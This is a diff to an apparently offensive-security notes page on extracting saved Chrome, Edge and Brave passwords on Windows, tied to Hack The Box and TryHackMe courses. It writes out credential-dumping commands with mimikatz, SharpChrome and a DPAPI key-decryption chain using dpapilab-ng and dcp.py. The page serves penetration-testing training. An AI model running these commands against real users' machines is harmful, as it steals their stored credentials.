@@ -37,6 +37,7 @@ PS> ls "$Env:localappdata/Google/Chrome/User Data/Default/Custom Dictionary.txt"
 
 #### Extract Chrome, Edge, and Brave Saved Passwords
 
+[![windows_privilege_escalation](../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
 [![chrome](../../../_badges/thm-p/chrome.svg)](https://tryhackme.com/room/chrome)
 
 On Windows, you can find the user browser sensitive files at:
@@ -55,6 +56,12 @@ For the current user, you can use:
 
 ```shell!
 mimikatz# dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+
+* **Decrypt on Windows** using [SharpChrome](https://github.com/GhostPack/SharpDPAPI) <small>(1.0k ⭐)</small> | [compiled](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
+
+```shell!
+PS> .\SharpChrome.exe logins /unprotect
 ```
 
 * **Decrypt on Linux** using [pypykatz](/cybersecurity/red-team/tools/utilities/creds/pypykatz.md)
@@ -92,13 +99,13 @@ Once we have the DPAPI master key, we can alternatively decrypt the encrypted se
 
 On Linux, we can use [dpapilab-ng](https://github.com/tijldeneut/dpapilab-ng/blob/main/blobdec-with-masterkey.py) <small>(0.1k ⭐)</small> to decrypt the secret key and [dcp](https://github.com/palmenas/dcp/tree/main) <small>(0.002k ⭐)</small> to decrypt and dump passwords.
 
-```ps
-$ base64 -d > key.enc <<< "<secret key here>"
+```shell!
+$ base64 -d > key.enc <<< "<encrypted secret key here>"
 $ python -c "with open('key.enc', 'rb+') as f: data = f.read(); f.seek(0); f.write(data[5:]); f.truncate()" # remove the DPAPI text at the start of the file
 $ pip install dpapick3
 $ python3 blobdec-with-masterkey.py key.enc --masterkey "<master key here>"
 <secret_key_here>
-$ python3 dcp.py -S secret_key_here -P "./Default/Login Data"
+$ python3 dcp.py -S "<secret_key_here>" -P "./Default/Login Data"
 ```
 </div><div>
 </div></div>
